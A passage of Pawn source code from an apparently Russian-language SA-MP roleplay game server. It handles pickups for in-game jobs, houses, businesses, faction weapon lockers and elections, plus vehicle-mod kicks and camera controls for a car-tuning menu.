		case 0:
			{
				SetPlayerCheckpoint(playerid,p[0]+1.8,p[1]+0.7,p[2],1.0);
			}
		case 1:
			{
				SetPlayerCheckpoint(playerid,p[0]+1.4,p[1]+2.9,p[2],1.0);
			}
		case 2:
			{
				SetPlayerCheckpoint(playerid,p[0]-1.6,p[1]-1.7,p[2],1.0);
			}
		case 3:
			{
				SetPlayerCheckpoint(playerid,p[0]+2.1,p[1]+1.1,p[2],1.0);
			}
		}
	}
	if(pickupid == Bolnica[1]) // Больница
	{
		if(PlayerInfo[playerid][pHospital] == 0)
		{
			SetTimerEx("PlayerToggle", 500, false, "d", playerid);
			TogglePlayerControllable(playerid,false);
			SetPlayerPos(playerid, 1177.1229,-1325.0029,14.0551);
			SetPlayerVirtualWorld(playerid,0);
			SetPlayerInterior(playerid, 0);
			SetPlayerFacingAngle(playerid, 90);
			return true;
		}
		else SendClientMessage(playerid,COLOR_GREY,"Вы все еще больны, на улицу выходить опасно!");
	}
	if(pickupid == robmats[0] || pickupid == robmats[1] || pickupid == robmats[2] || pickupid == robmats[3] || pickupid == robmats[4] || pickupid == robmats[5] || pickupid == robmats[6] || pickupid == robmats[7] || pickupid == robmats[8])
	{
		if(IsACop(playerid)) return SendClientMessage(playerid, COLOR_WHITE, "Доступна только бандитам!");
		if(PlayerInfo[playerid][pMember] == F_ARMY) return SendClientMessage(playerid, COLOR_WHITE, "Ты не заболел?");
		if(PlayerInfo[playerid][pRank] < 3) return SendClientMessage(playerid, COLOR_WHITE, "Функция доступна с 3 ранга и выше!");
		if(PlayerInfo[playerid][pMats] >= 500) return SendClientMessage(playerid, COLOR_WHITE,"У вас достаточно материалов.!");
		if(PlayerInfo[playerid][pLevel] <= 1) return SendClientMessage(playerid,COLOR_YELLOW,"Покупка, продажа, использование оружие будет доступно со 2 уровня!");
		{
			PlayerInfo[playerid][pMats] = 500;
			Mats[0] -= 500;
			SendClientMessage(playerid, COLOR_WHITE, "Вы успешно украли материалы!");
			SetOtherInt("armymats", Mats[0]);
			format(string, 50, "материалов: {9ACD32}%i / 500000", Mats[0]);
			Update3DTextLabelText(tPickup[5], 0xFFFFFFFF, string);
			Update3DTextLabelText(tPickup[12], 0xFFFFFFFF, string);
		}
		return 1;
	}
	if(pickupid == sportpickup)
	{
		ShowPlayerDialog(playerid,6446,DIALOG_STYLE_MSGBOX,"Раздевалка","Вы хотите надеть/снять форму и начать/закончить тренировку?","Да","Нет");
		return true;
	}
	if(pickupid == razdelshaht)
    {
    	if(Shaht[playerid] == 0 && PlayerInfo[playerid][pMember] == 0)
    	{
        	ShowPlayerDialog(playerid,700,DIALOG_STYLE_MSGBOX,"Раздевалка шахтеров","Хотите начать работу шахтера?","Да","Нет");
        	return 1;
        }
        else
        if(Shaht[playerid] == 1 && PlayerInfo[playerid][pMember] == 0)
		{
        	ShowPlayerDialog(playerid,668,DIALOG_STYLE_MSGBOX,"Раздевалка шахтеров","Хотите завершить работу шахтера?","Да","Нет");
        	return 1;
        }
    }
  	if(pickupid == razdelgruzika)
    {
    	if(Gruzik[playerid] == 0 && PlayerInfo[playerid][pMember] == 0)
    	{
        	ShowPlayerDialog(playerid,23000,DIALOG_STYLE_MSGBOX,"Раздевалка","Хотите начать работу грузчика?","Да","Нет");
        	return 1;
        }
        else
        if(Gruzik[playerid] == 1 && PlayerInfo[playerid][pMember] == 0)
		{
        	ShowPlayerDialog(playerid,23001,DIALOG_STYLE_MSGBOX,"Раздевалка шахтеров","Хотите завершить работу грузчика?","Да","Нет");
        	return 1;
        }
    }
    if(pickupid == kassenter)
    {
		SetPlayerPos(playerid,2575.4194,-1290.1809,1044.1250);
    	SetPlayerFacingAngle(playerid, 90);
    	SetCameraBehindPlayer(playerid);
		SetPlayerInterior(playerid,2);
    }
   if(pickupid == kassexit)
    {
		SetPlayerPos(playerid,2591.9246,2790.5940,10.8203);
    	SetPlayerFacingAngle(playerid, 90);
    	SetCameraBehindPlayer(playerid);
		SetPlayerVirtualWorld(playerid,0);
	    SetPlayerInterior(playerid, 0);
    }
   	if(pickupid == razdelzveh)
    {
    	if(ZPerevoz[playerid] == 0 && PlayerInfo[playerid][pMember] == 0)
    	{
        	ShowPlayerDialog(playerid,104,DIALOG_STYLE_MSGBOX,"Раздевалка водителей","Хотите начать развозку?","Да","Нет");
        	return 1;
        }
        else if(ZPerevoz[playerid] == 1 && PlayerInfo[playerid][pMember] == 0)
        {
        	ShowPlayerDialog(playerid,300,DIALOG_STYLE_MSGBOX,"Раздевалка водителей","Хотите завершить развозку?","Да","Нет");
        }
    }
    	if(pickupid == razdelzav)
    {
    	if(Zavod[playerid] == 0 && PlayerInfo[playerid][pMember] == 0)
    	{
        	ShowPlayerDialog(playerid,19999,DIALOG_STYLE_MSGBOX,"Раздевалка рабочих","Хотите начать работу изготовителя патронов?","Да","Нет");
        	return 1;
        }
        else if(Zavod[playerid] == 1 && PlayerInfo[playerid][pMember] == 0)
		{
        	ShowPlayerDialog(playerid,103,DIALOG_STYLE_MSGBOX,"Раздевалка рабочих","Хотите завершить работу изготовителя патронов?","Да","Нет");
        }
    }
	if(pickupid == reddragonpickup[0])
	{
		if(pDice[playerid] == 1)
		{
			SendClientMessage(playerid, COLOR_WHITE,"У вас уже есть кости!");
		}
		else
		{
			pDice[playerid] = 1;
			SendClientMessage(playerid, COLOR_WHITE,"Вы купили кости! (/dice)");
		}
		return true;
	}
	if(pickupid == reddragonpickup[1])
	{
		SendClientMessage(playerid, COLOR_WHITE,"В разработке");
		return true;
	}
	if(pickupid == gryz1)
	{
		if(PlayerInfo[playerid][pMember] != 0 || PlayerInfo[playerid][pLeader] != 0) return SendClientMessage(playerid, COLOR_YELLOW,"Вы работаете в организации/банде");
		ShowPlayerDialog(playerid,6435,DIALOG_STYLE_MSGBOX,"Раздевалка","Вы хотите переодеться чтобы начать работу?","Да","Нет");
		return true;
	}
	if(pickupid == gryz2)
	{
		if(PlayerInfo[playerid][pMember] != 0 || PlayerInfo[playerid][pLeader] != 0) return SendClientMessage(playerid, COLOR_YELLOW,"Вы работаете в организации/банде");
		if(PlayerInJob[playerid] == 0)
		{
			SendClientMessage(playerid, COLOR_RED, "Сначала переоденьтесь");
		}
		else
		{
			ShowPlayerDialog(playerid,6433,DIALOG_STYLE_MSGBOX,"Касса","Вы хотите получить зарплату и закончить работу?","Да","Нет");
		}
		return true;
	}
	if(pickupid == gryz3)
	{
		ShowPlayerDialog(playerid,104,DIALOG_STYLE_MSGBOX,"Работа > Грузчик","1. Чтобы начать работу зайдите в это здание и переоденьтесь в рабочую одежду\n2. На вашей карте появится чекпоинт, идите на него чтобы взять ящик\n3. Отнесите ящик на склад и идите за новым ящиком\n4. Когда отнесете нужное вам количество ящиков\nприходите в кассу за зарплатой, она находится рядом с раздевалкой","Закрыть","");
		return true;
	}
	if(pickupid == narkopikup)
	{
		if(!IsAGang(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Вас попросили уйти. Вы должны состоять в банде, что бы вырубить наркотики!");
		ShowPlayerDialog(playerid,1212,DIALOG_STYLE_INPUT,"Покупка травы","Введите кол-во грамм которое вы хотите купить.","Купить","Отмена");
		return true;
	}
	if(pickupid == FarmInfo[fDuty])
	{
		if(PlayerInfo[playerid][pMember] != 0 || PlayerInfo[playerid][pLeader] != 0) return SendClientMessage(playerid, COLOR_YELLOW,"Вы работаете в организации/банде");
		SetPVarInt(playerid,"FarmUsed",1);
		if(GetPVarInt(playerid,"FarmDuty") == 1)
		{
			ShowPlayerDialog(playerid,D_FARM,DIALOG_STYLE_MSGBOX,"Раздевалка","Вы хотите завершить работу фермера?","ДА","НЕТ");
		}
		else
		{
			ShowPlayerDialog(playerid,D_FARM,DIALOG_STYLE_MSGBOX,"Раздевалка","Вы хотите начать работу фермера?","ДА","НЕТ");
		}
		return true;
	}
	if(pickupid == FarmInfo[fPickup])
	{
		SendMes(playerid,-1,"Ферма платит %d$ за 1 куст",FarmInfo[fPay]);
		return true;
	}
	for(new idx = 1; idx <= TOTALHOUSE; idx++)
	{
		if(pickupid == HouseInfo[idx][hPickup])
		{
			SetPVarInt(playerid, "PlayerHouse", idx);
			if(!strcmp(HouseInfo[idx][hOwner],"None",true))
			{
				new startmoney;
				if(!strcmp("E",HouseInfo[idx][hDiscript],true)) startmoney = 50;
				if(!strcmp("D",HouseInfo[idx][hDiscript],true)) startmoney = 100;
				if(!strcmp("C",HouseInfo[idx][hDiscript],true)) startmoney = 150;
				if(!strcmp("B",HouseInfo[idx][hDiscript],true)) startmoney = 200;
				if(!strcmp("A",HouseInfo[idx][hDiscript],true)) startmoney = 250;
				if(!strcmp("L",HouseInfo[idx][hDiscript],true)) startmoney = 300;
				HouseInfo[idx][hOplata] = startmoney;
				format(string,256,"{ffffff}\t\tДом №:%d\n\nСтоимость:\t\t\t%d\nКласс:\t\t\t\t%s\nКвартплата составляет:\t%d$ в час",idx,GetInflationPrice(HouseInfo[idx][hPrice]),HouseInfo[idx][hDiscript],startmoney);
				return ShowPlayerDialog(playerid, D_JOINHOUSE, 0,"Дом",string,"Купить","Отмена");
			}
			else
			{
				new ttextt[32],ttexttt[32];
				if(GetPlayerID(HouseInfo[idx][hOwner]) == INVALID_PLAYER_ID) format(ttextt,sizeof(ttextt),"[{3caa3c}Offline{ffffff}]");
				else format(ttextt,sizeof(ttextt),"[{3caa3c}Online{ffffff}]");
				if((HouseInfo[idx][hLock]) == 0) format(ttexttt,sizeof(ttexttt),"[{3caa3c}Открыто{ffffff}]");
				else format(ttexttt,sizeof(ttexttt),"[{3caa3c}Закрыто{ffffff}]");
				format(string,256,"{ffffff}\t\tДом №:%d\n\nВладелец:\t%s %s\nКласс:\t\t[{3caa3c}%s{ffffff}]\nДверь:\t\t%s",idx,HouseInfo[idx][hOwner],ttextt,HouseInfo[idx][hDiscript],ttexttt);
				return ShowPlayerDialog(playerid, D_JOINHOUSE, 0,"Дом",string,"Войти","Отмена");
			}
		}
	}
	for(new idx = 1; idx <= TOTALBIZZ; idx++)
	{
		if(pickupid == BizzInfo[idx][bPickup])
		{
			if(!strcmp(BizzInfo[idx][bOwner],"None",true))
			{
				SetPVarInt(playerid, "PlayerBizz", idx);
				format(string,90,"Номер бизнеса:\t№%i\nСтоимость:\t\t%i\n\nВы хотите войти в бизнес?",idx,GetInflationPrice(BizzInfo[idx][bPrice]));
				if(BizzInfo[idx][bType] != 2 && BizzInfo[idx][bType] != 7) return ShowPlayerDialog(playerid, D_HEAL+9, 0, "Бизнес", string, "Да", "Нет");
			}
			else
			{
				SetPVarInt(playerid, "PlayerBizz", idx);
				if(BizzInfo[idx][bType] == 4 || BizzInfo[idx][bType] == 5)
				{
					if(BizzInfo[idx][bEnter] > 0) format(string, 64, "Цена входа: %i долларов\n\nВы хотите войти в бизнес?", BizzInfo[idx][bEnter]);
					else format(string, 64, "Вход бесплатный\n\nВы хотите войти в бизнес?");
					ShowPlayerDialog(playerid, D_HEAL+26, 0, "Бизнес", string, "Да", "Нет");
					return true;
				}
				if(BizzInfo[idx][bType] != 2 && BizzInfo[idx][bType] != 7) return ShowPlayerDialog(playerid, D_HEAL+9, 0, "Бизнес", "Вы хотите войти?", "Да", "Нет");
			}
		}
	}
	for(new i; i <= TOTALENTERS; i++)
	{
		if(pickupid == EntersInfo[i][pP])
		{
			if(i == 45 || i == 47)
			{
				if(Ether[playerid] == true)
				{
					new CB[16];
					Ether[playerid] = false;
					Convert(GetPVarInt(playerid,"InEther"),CB);
					if(EtherSms[PlayerInfo[playerid][pNews]-1] == true) { format(string, 90, "[F] %s выключил прием СМС",PlayerInfo[playerid][pSendername]); SendFMes(PlayerInfo[playerid][pMember], COLOR_LIGHTRED, string); }
					if(EtherCall[PlayerInfo[playerid][pNews]-1] == true) { format(string, 90, "[F] %s выключил прием звонков",PlayerInfo[playerid][pSendername]); SendFMes(PlayerInfo[playerid][pMember], COLOR_LIGHTRED, string); }
					format(string, 90, "[F] %s вышел(а) из прямого эфира (Время в эфире: %s, звонков: %i, СМС: %i)",PlayerInfo[playerid][pSendername], CB, CallNews[PlayerInfo[playerid][pNews]-1],SmsNews[PlayerInfo[playerid][pNews]-1]);
					SendFMes(PlayerInfo[playerid][pMember], COLOR_LIGHTRED, string);
					EtherSms[PlayerInfo[playerid][pNews]-1] = false;
					EtherCall[PlayerInfo[playerid][pNews]-1] = false;
					SmsNews[PlayerInfo[playerid][pNews]-1] = 0;
					CallNews[PlayerInfo[playerid][pNews]-1] = 0;
					DeletePVar(playerid, "InEther");
					if(Mobile[playerid] != -1) MobileCrash(playerid);
				}
				if(EtherLive[playerid] == true)
				{
					EtherLive[playerid] = false;
					DeletePVar(playerid, "Etherfrac");
					SendClientMessage(playerid, COLOR_LIGHTRED, "Вы вышли из прямого эфира");
				}
			}
			SetPlayerPos(playerid,EntersInfo[i][ptX],EntersInfo[i][ptY],EntersInfo[i][ptZ]);
			SetPlayerFacingAngle(playerid, EntersInfo[i][ptFa]);
			SetPlayerInterior(playerid,EntersInfo[i][ptI]);
			SetPlayerVirtualWorld(playerid,EntersInfo[i][ptV]);
			SetTimerEx("PlayerToggle", 500, false, "d", playerid);
			TogglePlayerControllable(playerid,false);
			return true;
		}
	}
	if(pickupid == cPickup[0]) return ShowPlayerDialog(playerid, D_JOINCARS, 0, "Автосалон 'C' класса", "Вас приветствует автосалон 'C'\nПерейти к покупке транспорта?", "Перейти", "Закрыть");
	if(pickupid == cPickup[1]) return ShowPlayerDialog(playerid, D_JOINCARS+1, 0, "Автосалон 'B' класса", "Вас приветствует автосалон 'B'\nПерейти к покупке транспорта?", "Перейти", "Закрыть");
	if(pickupid == cPickup[2]) return ShowPlayerDialog(playerid, D_JOINCARS+2, 0, "Автосалон 'A' класса", "Вас приветствует автосалон 'A'\nПерейти к покупке транспорта?", "Перейти", "Закрыть");
	if(pickupid == Pickup[0])
	{
		if(Pick == false) return SendClientMessage(playerid, COLOR_GREY, "В штате нет выборов!");
		if(PlayerInfo[playerid][pPick] > 0) return SendClientMessage(playerid, COLOR_GREY, "Вы уже голосовали на этих выборах!");
		new str[256], srrt[256], full = 0;
		for(new i = 0; i < 7; i++)
		{
			if(strcmp(PickName[i],"None",false))
			{
				format(str, sizeof(str), "Проголосовать за - %s\n", PickName[i]);
				strcat(srrt, str);
				full++;
			}
		}
		if(full == 0) strcat(srrt, "Кандидатов нет"), ShowPlayerDialog(playerid, D_NULL, 0, "Выборы", srrt, "Закрыть", "");
		else ShowPlayerDialog(playerid, D_PICK, DIALOG_STYLE_LIST, "Выборы", srrt, "Принять", "Отмена");
		return true;
	}
	if(pickupid == Pickup[2]) // lspd
	{
		if(PlayerInfo[playerid][pMember] == F_POLICE_LS || PlayerInfo[playerid][pMember] == F_MAYOR && PlayerInfo[playerid][pRank] == 1)
		{
			if(GetPVarInt(playerid, "GunTimeTake") > gettime()) return SendClientMessage(playerid, COLOR_GREY, "Брать оружие можно раз в 5 минут!");
			if(Mats[1] <= 0) return SendClientMessage(playerid, COLOR_GREY, "На складе нет материалов!");
			if(PlayerInfo[playerid][pLevel] <= 1) return SendClientMessage(playerid,COLOR_YELLOW,"Покупка, продажа, использование оружие будет доступно со 2 уровня!");
			GiveWeapon(playerid, 24, 100);
			GiveWeapon(playerid, 41, 100);
			GiveWeapon(playerid, 3, 100);
			GiveWeapon(playerid, 31, 100);
			SetHealth(playerid, 100);
			SetArmour(playerid, 100);
			SendClientMessage(playerid, COLOR_LIGHTGREEN, "Выдано: {ffffff}Nightstick, Desert Eagle, M4");
			Mats[1] -= 200;
			//format(string, 50, "материалов: {9ACD32}%i / 500000", Mats[1]);
			Update3DTextLabelText(tPickup[3], 0xFFFFFFFF, string);
			SetOtherInt("lspdmats", Mats[1]);
			SetPVarInt(playerid, "GunTimeTake", gettime()+300);
		}
		else SendClientMessage(playerid, COLOR_GREY, "Вы не можете взять комплект оружия!");
		return true;
	}
	if(pickupid == Pickup[8]) // lspd
	{
		if(PlayerInfo[playerid][pMember] == F_MAYOR)
		{
			if(GetPVarInt(playerid, "GunTimeTake") > gettime()) return SendClientMessage(playerid, COLOR_GREY, "Брать оружие можно раз в 5 минут!");
			if(PlayerInfo[playerid][pLevel] <= 1) return SendClientMessage(playerid,COLOR_YELLOW,"Покупка, продажа, использование оружие будет доступно со 2 уровня!");
			GiveWeapon(playerid, 24, 100);
			GiveWeapon(playerid, 31, 100);
			SetHealth(playerid, 100);
			SetArmour(playerid, 100);
			SendClientMessage(playerid, COLOR_LIGHTGREEN, "Выдано: {ffffff}Desert Eagle, M4");
			Mats[1] -= 200;
			//format(string, 50, "материалов: {9ACD32}%i / 500000", Mats[1]);
			Update3DTextLabelText(tPickup[3], 0xFFFFFFFF, string);
			SetOtherInt("lspdmats", Mats[1]);
			SetPVarInt(playerid, "GunTimeTake", gettime()+300);
		}
		else SendClientMessage(playerid, COLOR_GREY, "Вы не можете взять комплект оружия!");
		return true;
	}
	if(pickupid == Pickup[3]) // sfpd
	{
		if(PlayerInfo[playerid][pMember] != F_POLICE_SF) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете взять комплект оружия!");
		if(GetPVarInt(playerid, "GunTimeTake") > gettime()) return SendClientMessage(playerid, COLOR_GREY, "Брать оружие можно раз в 5 минут!");
		if(Mats[2] <= 0) return SendClientMessage(playerid, COLOR_GREY, "На складе нет материалов!");
		if(PlayerInfo[playerid][pLevel] <= 1) return SendClientMessage(playerid,COLOR_YELLOW,"Покупка, продажа, использование оружие будет доступно со 2 уровня!");
		GiveWeapon(playerid, 24, 100);
		GiveWeapon(playerid, 41, 100);
		GiveWeapon(playerid, 3, 100);
		GiveWeapon(playerid, 31, 100);
		SetHealth(playerid, 100);
		SetArmour(playerid, 100);
		SendClientMessage(playerid, COLOR_LIGHTGREEN, "Выдано: {ffffff}Nightstick, Desert Eagle, M4");
		Mats[2] -= 200;
		SetOtherInt("sfpdmats", Mats[2]);
		SetPVarInt(playerid, "GunTimeTake", gettime()+300);
		//format(string, 50, "материалов: {9ACD32}%i / 500000", Mats[2]);
		Update3DTextLabelText(tPickup[4], 0xFFFFFFFF, string);
		return true;
	}
	if(pickupid == Pickup[4]) // fbi
	{
		if(PlayerInfo[playerid][pMember] != F_FBI) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете взять комплект оружия!");
		if(GetPVarInt(playerid, "GunTimeTake") > gettime()) return SendClientMessage(playerid, COLOR_GREY, "Брать оружие можно раз в 5 минут!");
		if(Mats[4] <= 0) return SendClientMessage(playerid, COLOR_GREY, "На складе нет материалов!");
		if(PlayerInfo[playerid][pLevel] <= 1) return SendClientMessage(playerid,COLOR_YELLOW,"Покупка, продажа, использование оружие будет доступно со 2 уровня!");
		GiveWeapon(playerid, 24, 100);
		GiveWeapon(playerid, 41, 100);
		GiveWeapon(playerid, 29, 100);
		GiveWeapon(playerid, 31, 100);
		SetHealth(playerid, 100);
		SetArmour(playerid, 100);
		SendClientMessage(playerid, COLOR_LIGHTGREEN, "Выдано: {ffffff}Desert Eagle, MP5, M4");
		Mats[4] -= 300;
		SetOtherInt("fbimats", Mats[4]);
		SetPVarInt(playerid, "GunTimeTake", gettime()+300);
		//format(string, 50, "материалов: {9ACD32}%i / 500000", Mats[4]);
		Update3DTextLabelText(tPickup[6], 0xFFFFFFFF, string);
		return true;
	}
	if(pickupid == Pickup[5]) // army
	{
		if(PlayerInfo[playerid][pMember] != F_ARMY) return SendClientMessage(playerid, COLOR_GREY, "Вы не можете взять комплект оружия!");
		if(GetPVarInt(playerid, "GunTimeTake") > gettime()) return SendClientMessage(playerid, COLOR_GREY, "Брать оружие можно раз в 5 минут!");
		if(Mats[0] > 0)
		{
			if(PlayerInfo[playerid][pLevel] <= 1) return SendClientMessage(playerid,COLOR_YELLOW,"Покупка, продажа, использование оружие будет доступно со 2 уровня!");
			GiveWeapon(playerid, 24, 100);
			GiveWeapon(playerid, 41, 100);
			GiveWeapon(playerid, 29, 100);
			GiveWeapon(playerid, 31, 100);
			SetHealth(playerid, 100);
			SetArmour(playerid, 100);
			SendClientMessage(playerid, COLOR_LIGHTGREEN, "Выдано: {ffffff}Desert Eagle, MP5, M4");
			Mats[0] -= 300;
			SetOtherInt("armymats", Mats[0]);
			SetPVarInt(playerid, "GunTimeTake", gettime()+300);
			//format(string, 50, "материалов: {9ACD32}%i / 500000", Mats[0]);
			Update3DTextLabelText(tPickup[5], 0xFFFFFFFF, string);
			Update3DTextLabelText(tPickup[12], 0xFFFFFFFF, string);
		}
		else SendClientMessage(playerid, COLOR_GREY, "На складе нет материалов!");
		return true;
	}
	if(pickupid == Pickup[6] || pickupid == Pickup[7])
	{
		if(PlayerInfo[playerid][pMember] == F_CASINO || PlayerInfo[playerid][pMember] == F_REDDRAGON) return SendClientMessage(playerid, COLOR_GREY, "Покупка одежды недоступна для казино!");
		ShowPlayerDialog(playerid, D_JOB+31, 0, "Одежда", "Вы хотите перейти к выбору одежды?", "Да", "Нет");
	}
	if(pickupid == Pickup[19])
	{
		new pdddialog[2148];
		format(pdddialog, sizeof(pdddialog), "%s%s%s%s%s%s%s%s%s%s%s", newPlayer[0], newPlayer[1], newPlayer[2], newPlayer[3],newPlayer[4], newPlayer[5], newPlayer[6], newPlayer[7],
		newPlayer[8], newPlayer[9], newPlayer[10]);
		return ShowPlayerDialog(playerid, D_NULL, 0, "{ffffff}", pdddialog, "Закрыть", "");
	}
	if(pickupid == Pickup[21])
	{
		new pdddialog[2148];
		format(pdddialog, sizeof(pdddialog), "%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s", pddMSG[0], pddMSG[1], pddMSG[2], pddMSG[3], pddMSG[4], pddMSG[5], pddMSG[6], pddMSG[7]
		, pddMSG[8], pddMSG[9], pddMSG[10], pddMSG[11], pddMSG[12], pddMSG[13], pddMSG[14], pddMSG[15], pddMSG[16]);
		ShowPlayerDialog(playerid,D_NULL,DIALOG_STYLE_MSGBOX,"{33AAFF}Правила Дорожного Движения", pdddialog, "Закрыть", "");
	}
	if(pickupid == Pickup[22])
	{
		format(string, 256, "{ffffff}Введите кол-во кг рыбы:\n\nВы имеете {8d8dff}%i{ffffff} кг рыбы\nНа {8D8DFF}1{ffffff} единицу кг рыбы приходиться {8D8DFF}5 {ffffff}долларов", PlayerInfo[playerid][pFish]);
		ShowPlayerDialog(playerid, D_JOB+60, 1, "Рыба", string, "Принять", "Отмена");
	}
	if(pickupid == Pickup[26])
	{
		if(PlayerInfo[playerid][pMember] > 0) return SendClientMessage(playerid, COLOR_GREY, "Сначало увольтесь из организации!");
		if(PlayerInfo[playerid][pLic][0] == 0) return SendClientMessage(playerid, COLOR_GREY, "У вас нет водительских прав!");
		if(GetPVarInt(playerid, "Noun") == 0) ShowPlayerDialog(playerid, D_JOB+63, 0, "Работа на бульдозере", "Вы хотите начать работу на бульдозере?", "Да", "Нет");
		else ShowPlayerDialog(playerid, D_JOB+64, 0, "Работа на бульдозере", "Вы хотите закончить работу на бульдозере?", "Да", "Нет");
	}
	if(pickupid == Pickup[27] || pickupid == Pickup[28] || pickupid == Pickup[29])
	{
		if(PlayerInfo[playerid][pLevel] > 1) return SendClientMessage(playerid, COLOR_GREY, "Доступно только 1 уровню!");
		if(PlayerInfo[playerid][pHeal] >= 90) return SendClientMessage(playerid, COLOR_GREY, "Вы не голодны!");
		SetHealth(playerid, 100);
		PlayerPlaySound(playerid, 32200, 0.0, 0.0, 0.0);
		ClearAnimations(playerid);
		ApplyAnimation(playerid, "FOOD", "EAT_Burger", 4.0, 0, 0, 0, 0, 0,1);
		PlayerInfo[playerid][pSatiety] = 100;
		SendClientMessage(playerid, COLOR_PURPLE, "Вы съели кусочек пиццы!");
		return true;
	}
	if(pickupid == Pickup_Mech[GetPVarInt(playerid, "PlayerMechVehID")])
	{
		SetPVarInt(playerid, "PlayerMechTime", 10);
		ApplyAnimation(playerid,"CASINO","dealone",4.1,1,1,1,1,1);
		return true;
	}
	if(pickupid == Pickup[30]) return ShowPlayerDialog(playerid, D_NULL, 0, "{ffffff}", "{ffffff}В разработке", "Закрыть", "");
	if(pickupid == Pickup[33]) // Казино
	{
		print("встал на пикап казино");
		if(PlayerInfo[playerid][pMember] == F_CASINO || PlayerInfo[playerid][pLeader] == F_CASINO)
		{
			ShowPlayerDialog(playerid,8600,DIALOG_STYLE_MSGBOX,"Раздевалка Casino Caligula's","Вы хотите начать или завершить работу крупье?","Начать","Завершить");
		}
		else SendClientMessage(playerid, COLOR_WHITE, "Вы не работник Казино Калигула!");
	}
	if(pickupid == narkoenter[0])
	{
		SetPlayerInterior(playerid,5);
		SetPlayerPos(playerid,318.2598,1118.8209,1083.8828);
		SetPlayerFacingAngle(playerid, 2.7967);
		SetPlayerVirtualWorld(playerid, 0);
	}
	if(pickupid == narkoenter[1])
	{
		SetPlayerInterior(playerid,0);
		SetPlayerPos(playerid,2157.0977,-1616.5548,14.1826);
		SetPlayerFacingAngle(playerid,217.7220);
		SetPlayerVirtualWorld(playerid,0);
	}
	return true;
}
public OnVehicleMod(playerid, vehicleid, componentid)
{
	KickEx(playerid,1424);
	RemoveVehicleComponent(vehicleid,componentid);
	return true;
}
public OnVehiclePaintjob(playerid, vehicleid, paintjobid)
{
	return true;
}
public OnVehicleRespray(playerid, vehicleid, color1, color2)
{
	SendMes(playerid,-1,"test %d, %d", color1,color2);
	if(GetPlayerInterior(playerid) == 0 && GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
	{
		if(GetPlayerHouse(playerid) && GetPVarInt(playerid, "PlayerCar") == vehicleid)
		{
			PlayerInfo[playerid][cColor][0] = color1;
			PlayerInfo[playerid][cColor][1] = color2;
		}
		else
		{
			KickEx(playerid,1442);
		}
	}
	return true;
}
public OnPlayerClickTextDraw(playerid, Text:clickedid)
{
	if(GetPVarInt(playerid,"UsedCTO") == 1)
	{
		if(GetPVarInt(playerid,"AntiFlood") > gettime()) return true;
		SetPVarInt(playerid,"AntiFlood",gettime() + 3);
		if(clickedid == ButtonRight)
		{
			if(pUsedVid == 0)
			{
				pUsedVid = 1;
				InterpolateCameraPos(playerid, 610.0254,-130.5426,999.9613, 614.7007,-120.8677,997.6154, 3000, 1);
				InterpolateCameraLookAt(playerid, 614.8722,-124.8770,997.6656,614.8722,-124.8770,997.6656, 10000,1);
				VectPx=610.0254;
				VectPy=-130.5426;
				VectPz= 999.9613;
			}
			if(pUsedVid == 1)
			{
				pUsedVid = 2;
				InterpolateCameraPos(playerid, 610.0254,-130.5426,999.9613, 614.7007,-120.8677,997.6154, 3000, 1);
				InterpolateCameraLookAt(playerid, 614.8722,-124.8770,997.6656,614.8722,-124.8770,997.6656, 10000,1);
				VectPx=614.7007;
				VectPy=-120.8677;
				VectPz= 997.6154;
			}
			else if(pUsedVid == 2)
			{
				pUsedVid = 3;
				InterpolateCameraPos(playerid, VectPx, VectPy, VectPz, 620.7278,-125.3816,1000.1062, 3000, 1);
				InterpolateCameraLookAt(playerid, 614.8722,-124.8770,997.6656,614.8722,-124.8770,997.6656, 10000,1);
				VectPx=620.7278;
				VectPy=-125.3816;
				VectPz=1000.1062;
			}
			else if(pUsedVid == 3)
			{
				pUsedVid = 4;
				InterpolateCameraPos(playerid, VectPx, VectPy, VectPz, 614.7285,-129.9550,999.1755, 3000, 1);
				InterpolateCameraLookAt(playerid, 614.8722,-124.8770,997.6656,614.8722,-124.8770,997.6656, 10000,1);
				VectPx=614.7285;
				VectPy=-129.9550;
				VectPz= 999.1755;
			}
			else if(pUsedVid == 4)
			{
				pUsedVid = 1;
				InterpolateCameraPos(playerid, VectPx, VectPy, VectPz, 610.1808,-125.3275,1000.1604, 3000, 1);
				InterpolateCameraLookAt(playerid, 614.8722,-124.8770,997.6656,614.8722,-124.8770,997.6656, 10000,1);
				VectPx=610.1808;
				VectPy=-125.3275;
				VectPz= 1000.1604;
			}
		}
		if(clickedid == ButtonLeft)
		{
			if(pUsedVid == 0)
			{
				pUsedVid = 4;
				InterpolateCameraPos(playerid, 610.0254,-130.5426,999.9613, 614.7007,-120.8677,997.6154, 3000, 1);
				InterpolateCameraLookAt(playerid, 614.8722,-124.8770,997.6656,614.8722,-124.8770,997.6656, 10000,1);
				VectPx=614.7007;
				VectPy=-120.8677;
				VectPz= 997.6154;
			}
			if(pUsedVid == 4)
			{
				pUsedVid = 3;
				InterpolateCameraPos(playerid, 610.0254,-130.5426,999.9613, 614.7007,-120.8677,997.6154, 3000, 1);
				InterpolateCameraLookAt(playerid, 614.8722,-124.8770,997.6656,614.8722,-124.8770,997.6656, 10000,1);
			}
			else if(pUsedVid == 3)
			{
				pUsedVid = 2;
				InterpolateCameraPos(playerid, VectPx, VectPy, VectPz, 620.7278,-125.3816,1000.1062, 3000, 1);
				InterpolateCameraLookAt(playerid, 614.8722,-124.8770,997.6656,614.8722,-124.8770,997.6656, 10000,1);
				VectPx=620.7278;
				VectPy=-125.3816;
				VectPz=1000.1062;
			}
			else if(pUsedVid == 2)
			{
				pUsedVid = 1;
				InterpolateCameraPos(playerid, VectPx, VectPy, VectPz, 614.7285,-129.9550,999.1755, 3000, 1);
				InterpolateCameraLookAt(playerid, 614.8722,-124.8770,997.6656,614.8722,-124.8770,997.6656, 10000,1);
				VectPx=614.7285;
				VectPy=-129.9550;
				VectPz= 999.1755;
			}
			else if(pUsedVid == 1)
			{
				pUsedVid = 4;
				InterpolateCameraPos(playerid, VectPx, VectPy, VectPz, 610.1808,-125.3275,1000.1604, 3000, 1);
				InterpolateCameraLookAt(playerid, 614.8722,-124.8770,997.6656,614.8722,-124.8770,997.6656, 10000,1);
				VectPx=610.1808;
				VectPy=-125.3275;
				VectPz= 1000.1604;
			}
		}
		return true;
	}
	if(ClothesRound[playerid] == 1)
	{
		if(clickedid == ButtonRight)
		{
